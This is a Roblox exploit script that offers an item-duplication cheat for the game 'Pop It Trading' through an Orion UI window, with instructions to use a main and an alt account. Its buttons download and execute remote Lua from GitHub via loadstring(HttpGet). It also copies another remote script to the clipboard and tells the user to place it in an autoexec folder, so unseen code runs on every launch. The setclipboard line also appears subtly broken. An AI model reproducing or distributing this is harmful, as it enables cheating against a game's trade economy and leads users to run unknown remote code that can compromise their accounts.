local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "POP IT TRADING! Dupe Exploit (ALT NEEDED)", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
local Tab = Window:MakeTab({
	Name = "Dupe",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
OrionLib:MakeNotification({
	Name = "Duper",
	Content = "Welcome to the dupe script! Press Alt button if your on an alt, and Main if you are on your main.",
	Image = "rbxassetid://4483345998",
	Time = 5
})
wait(5)
OrionLib:MakeNotification({
	Name = "Duper",
	Content = "You will need to have 2 accounts.",
	Image = "rbxassetid://4483345998",
	Time = 5
})
wait(5)
OrionLib:MakeNotification({
	Name = "Duper",
	Content = "Give the items that you want to dupe to your alt after executing alt script! Do not pick them up!",
	Image = "rbxassetid://4483345998",
	Time = 5
})
OrionLib:MakeNotification({
	Name = "Duper",
	Content = "Then press main and listen to the instructions!",
	Image = "rbxassetid://4483345998",
	Time = 5
})
wait(5)
OrionLib:MakeNotification({
	Name = "Duper",
	Content = "Loading method...",
	Image = "rbxassetid://4483345998",
	Time = 5
})
wait(5)
Tab:AddButton({
	Name = "Alt",
	Callback = function()
OrionLib:MakeNotification({
	Name = "Duper",
	Content = "Alt script loaded! You can now use main feature",
	Image = "rbxassetid://4483345998",
	Time = 5
})
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChaseOSDeveloper/dupe/main/dupeAlt.lua",true))()
  	end    
})

Tab:AddButton({
	Name = "Main",
	Callback = function()
		OrionLib:MakeNotification({
	Name = "Duper",
	Content = "Copied script to clipboard! Please put the script we copied in your autoexec folder.",
	Image = "rbxassetid://4483345998",
	Time = 5
})
      		setclipboard(game:HttpGet("https://raw.githubusercontent.com/ChaseOSDeveloper/dupe/main/dupeMain.lua",true))()
  	end    
})
